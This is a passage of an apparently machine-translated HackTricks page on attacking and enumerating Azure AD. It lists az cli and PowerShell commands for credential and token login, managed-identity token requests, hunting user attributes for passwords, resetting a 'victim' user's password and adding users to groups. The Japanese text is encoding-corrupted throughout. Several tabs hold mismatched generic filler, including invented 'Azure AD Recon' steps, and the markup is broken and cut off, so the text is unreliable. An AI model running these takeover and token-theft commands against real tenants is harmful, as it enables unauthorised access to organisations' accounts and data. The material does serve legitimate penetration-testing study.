# Az - AzureADï¼ˆAADï¼‰

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

Azure Active Directoryï¼ˆAzure ADï¼‰ã¯ã€Microsoftã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹ç®¡ç†ã‚µãƒ¼ãƒ“ã‚¹ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€å¾“æ¥­å“¡ãŒçµ„ç¹”å†…å¤–ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã®ã«é‡è¦ã§ã‚ã‚Šã€Microsoft 365ã€Azureãƒãƒ¼ã‚¿ãƒ«ã€ãŠã‚ˆã³å¤šæ•°ã®ä»–ã®SaaSã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å«ã‚“ã§ã„ã¾ã™ã€‚Azure ADã®è¨­è¨ˆã¯ã€**èªè¨¼ã€æ‰¿èªã€ãŠã‚ˆã³ãƒ¦ãƒ¼ã‚¶ãƒ¼ç®¡ç†**ã‚’å«ã‚€é‡è¦ãªã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã‚µãƒ¼ãƒ“ã‚¹ã®æä¾›ã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚

Azure ADã®ä¸»ãªæ©Ÿèƒ½ã«ã¯ã€**å¤šè¦ç´ èªè¨¼**ã¨**æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹**ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ä»–ã®Microsoftã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚µãƒ¼ãƒ“ã‚¹ã¨ã®ã‚·ãƒ¼ãƒ ãƒ¬ã‚¹ãªçµ±åˆãŒè¡Œã‚ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¤§å¹…ã«å‘ä¸Šã•ã›ã€çµ„ç¹”ãŒåŠ¹æœçš„ã«ã‚¢ã‚¯ã‚»ã‚¹ãƒãƒªã‚·ãƒ¼ã‚’å®Ÿè£…ãŠã‚ˆã³å¼·åˆ¶ã™ã‚‹ã®ã‚’æ”¯æ´ã—ã¾ã™ã€‚Microsoftã®ã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®åŸºæœ¬çš„ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã—ã¦ã€Azure ADã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¤ãƒ‡ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ™ãƒ¼ã‚¹ã®ç®¡ç†ã«ä¸å¯æ¬ ã§ã™ã€‚

## ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£

### åˆ—æŒ™

ã“ã®åˆ—æŒ™ã«ã¯ã€[**az cliãƒ„ãƒ¼ãƒ«**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)ã€**PowerShellãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«** [**AzureAD**](https://www.powershellgallery.com/packages/AzureAD/)ï¼ˆã¾ãŸã¯[**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)ï¼‰ã€ãŠã‚ˆã³[**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps)ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

{% hint style="success" %}
Linuxã§ã¯ã€PowerShell Coreã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% endhint %}

#### **ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®é•ã„**

- **AzureAD** ã¯ã€Azure AD ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã® Microsoft ã® PowerShell ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã™ã€‚**Azure AD ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã™ã¹ã¦ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¡¨ç¤ºã›ãšã€Azure ãƒªã‚½ãƒ¼ã‚¹æƒ…å ±ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚
- **Az PowerShell** ã¯ã€PowerShell ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‹ã‚‰ **Azure ãƒªã‚½ãƒ¼ã‚¹ã‚’ç®¡ç†ã™ã‚‹**ãŸã‚ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã™ã€‚

### **æ¥ç¶š**

{% tabs %}
{% tab title="az cli" %}
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% endtab %}

{% tab title="Azure AD" %}
{% code overflow="wrap" %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
{% endtab %}

{% tab title="Raw PS" %}
{% code overflow="wrap" %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="Raw OS" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% endcode %}
{% endtab %}
{% endtabs %}

Azureã«**CLI**çµŒç”±ã§**ãƒ­ã‚°ã‚¤ãƒ³**ã™ã‚‹ã¨ã€**Microsoft**ã«æ‰€å±ã™ã‚‹**ãƒ†ãƒŠãƒ³ãƒˆ**ã‹ã‚‰**Azureã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ä½œæˆã§ãã‚‹ã‚‚ã®ã®ã‚ˆã†ã«ã€**ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã‚’æŒã£ã¦ã„ã¾ã™**ã€‚**ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã‚‹è¨±å¯ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒªã‚¹ãƒˆ**ã«ã¯ã™ã¹ã¦è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ãŒã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§è¨±å¯ã•ã‚Œã¦ã„ã¾ã™**ã€‚

ãŸã¨ãˆã°ã€**powershellã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ãŒ**èªè¨¼**ã«ä½¿ç”¨ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã¯**`1950a258-227b-4e31-a9cf-717495945fc2`**ã§ã™ã€‚ã‚¢ãƒ—ãƒªãŒã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œãªãã¦ã‚‚ã€ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ã¯ãã®ã‚¢ãƒ—ãƒªã‚’**ãƒ–ãƒ­ãƒƒã‚¯**ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã®ã‚¢ãƒ—ãƒªã‚’ä»‹ã—ã¦æ¥ç¶šã™ã‚‹ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ããªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãŸã ã—ã€**Azureã«æ¥ç¶šã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹ä»–ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆID**ã‚‚ã‚ã‚Šã¾ã™ï¼š
```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```
### ãƒ¦ãƒ¼ã‚¶ãƒ¼

{% tabs %}
{% tab title="az cli" %}
```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD Enumeration

### User Enumeration

To enumerate users in Azure AD, you can use tools like `Azure AD Recon` or `Azure AD User Enumeration`. These tools can help you gather information about users, such as display names, usernames, email addresses, and more.

#### Steps to Enumerate Users:

1. **Gather Information**: Use tools like `Azure AD Recon` to gather user information.
2. **Identify Users**: Identify valid user accounts within the Azure AD environment.
3. **Collect Data**: Collect data such as display names, usernames, and email addresses for further analysis.

### Group Enumeration

Similarly, you can enumerate groups in Azure AD using tools like `Azure AD Recon` or `Azure AD Group Enumeration`. These tools can assist in identifying groups and their members within the Azure AD environment.

#### Steps to Enumerate Groups:

1. **Gather Information**: Utilize tools like `Azure AD Recon` to gather group information.
2. **Identify Groups**: Identify existing groups in the Azure AD environment.
3. **List Members**: List the members of each group for additional insights.

### Device Enumeration

For enumerating devices in Azure AD, tools like `Azure AD Recon` or `Azure AD Device Enumeration` can be utilized. These tools can provide details about devices registered in the Azure AD environment.

#### Steps to Enumerate Devices:

1. **Gather Information**: Use tools like `Azure AD Recon` to collect device information.
2. **Identify Devices**: Identify registered devices within Azure AD.
3. **Retrieve Details**: Retrieve details suchjson as device names, types, and registration dates.

{% endtab %}
```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```
{% endtab %}

{% tab title="Az PowerShell" %}Azure ADã¸ã®æ¥ç¶šã«ã¯ã€Azãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚æ¬¡ã®æ‰‹é †ã«å¾“ã£ã¦ã€Azãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦Azure ADã«æ¥ç¶šã—ã¾ã™ã€‚{% endtab %}
```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```
{% endtab %}
{% endtabs %}

#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¤‰æ›´

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText â€“Force

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password â€“Verbose
```
{% endcode %}

### MFA & Conditional Access Policies

ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«MFAã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚’å¼·ããŠå‹§ã‚ã—ã¾ã™ãŒã€ä¸€éƒ¨ã®ä¼æ¥­ã¯è¨­å®šã—ãªã„ã‹ã€ç‰¹å®šã®å ´æ‰€ã€ãƒ–ãƒ©ã‚¦ã‚¶ã€ã¾ãŸã¯æ¡ä»¶ã‹ã‚‰ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸå ´åˆã«MFAã‚’å¿…è¦ã¨ã™ã‚‹æ¡ä»¶ä»˜ãã‚¢ã‚¯ã‚»ã‚¹ã§è¨­å®šã™ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚‰ã®ãƒãƒªã‚·ãƒ¼ã¯ã€é©åˆ‡ã«æ§‹æˆã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒã‚¤ãƒ‘ã‚¹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚æ¬¡ã®ç‚¹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

### ã‚°ãƒ«ãƒ¼ãƒ—

{% tabs %}
{% tab title="az cli" %}
```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD

Azure ADã¯ã€Azureã‚¯ãƒ©ã‚¦ãƒ‰ã‚µãƒ¼ãƒ“ã‚¹ã®èªè¨¼ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹ç®¡ç†ã‚’æä¾›ã™ã‚‹ãŸã‚ã®ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã§ã™ã€‚çµ„ç¹”ãŒAzure ADã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼æƒ…å ±ã‚„ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’ä¸€å…ƒç®¡ç†ã§ãã¾ã™ã€‚Azure ADã«ã¯ã€å¤šè¦ç´ èªè¨¼ã‚„ã‚·ãƒ³ã‚°ãƒ«ã‚µã‚¤ãƒ³ã‚ªãƒ³ãªã©ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿèƒ½ãŒçµ„ã¿è¾¼ã¾ã‚Œã¦ãŠã‚Šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªæ©Ÿèƒ½ãŒæä¾›ã•ã‚Œã¦ã„ã¾ã™ã€‚

Azure ADã‚’ãƒšãƒ³ãƒ†ã‚¹ãƒˆã™ã‚‹éš›ã«ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ä¸é©åˆ‡ãªæ§‹æˆã€ç‰¹æ¨©ã‚¢ã‚¯ã‚»ã‚¹ã®æ¨©é™ãªã©ã€æ§˜ã€…ãªè„†å¼±æ€§ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã¯ã€ã“ã‚Œã‚‰ã®è„†å¼±æ€§ã‚’æ¤œå‡ºã—ã€çµ„ç¹”ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã®å¯¾ç­–ã‚’ææ¡ˆã™ã‚‹ã“ã¨ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚

Azure ADã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«ã¯ã€é©åˆ‡ãªã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã®è¨­å®šã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã®éµå®ˆã€ãƒ­ã‚°ã®ç›£è¦–ãªã©ãŒé‡è¦ã§ã™ã€‚å®šæœŸçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã‚„è„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒ³ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¬ãƒ™ãƒ«ã‚’ç¶­æŒã—ã€æ‚ªæ„ã‚ã‚‹ã‚¢ã‚¯ã‚»ã‚¹ã‹ã‚‰çµ„ç¹”ã‚’ä¿è­·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% endtab %}
```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```
{% endtab %}

{% tab title="Az PowerShell" %}  
## Az PowerShell

### Connect to Azure AD

To connect to Azure AD using Az PowerShell, you can use the following command:

```powershell
Connect-AzAccount
```

This command will open a dialog box for you to enter your Azure AD credentials. After entering the credentials, you will be connected to Azure AD.

### List Azure AD Users

To list all the users in Azure AD using Az PowerShell, you can use the following command:

```powershell
Get-AzADUser
```

This command will retrieve a list of all the users in Azure AD along with their details.

### Get Azure AD User

To get details about a specific user in Azure AD using Az PowerShell, you can use the following command:

```powershell
Get-AzADUser -UserPrincipalName user@example.com
```

Replace `user@example.com` with the user's actual UPN (User Principal Name) to retrieve details about that specific user.

### Summary

In this section, we have covered how to connect to Azure AD, list all users, and get details about a specific user using Az PowerShell.  
{% endtab %}
```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
```
#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹

ã‚°ãƒ«ãƒ¼ãƒ—ã®æ‰€æœ‰è€…ã¯æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã§ãã¾ã™

{% code overflow="wrap" %}
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

{% hint style="warning" %}
